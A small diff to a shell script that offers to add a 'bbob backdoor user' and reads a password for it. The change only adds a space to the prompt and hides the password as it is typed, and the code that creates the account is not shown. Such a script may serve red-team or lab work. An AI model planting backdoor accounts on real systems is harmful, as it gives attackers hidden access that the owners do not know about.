@@ -16,13 +16,13 @@ if [ -z "$filepath" ]; then
     filepath="$(pwd)/commands.txt"
 fi
 
-echo -n "Add bbob backdoor user? [y/n]"
+echo -n "Add bbob backdoor user? [y/n] "
 read bbob
 
 if [ "$bbob" = "y" ] || [ "$bbob" = "Y" ]; then
 	userfilepath="$(pwd)/user.txt"
 	echo -n "Enter a password for bbob: "
-	read password
+	read -s password
 	if [ -z "$password" ]; then
 		echo -n "Password cannot be empty; exiting..."
 		exit 1
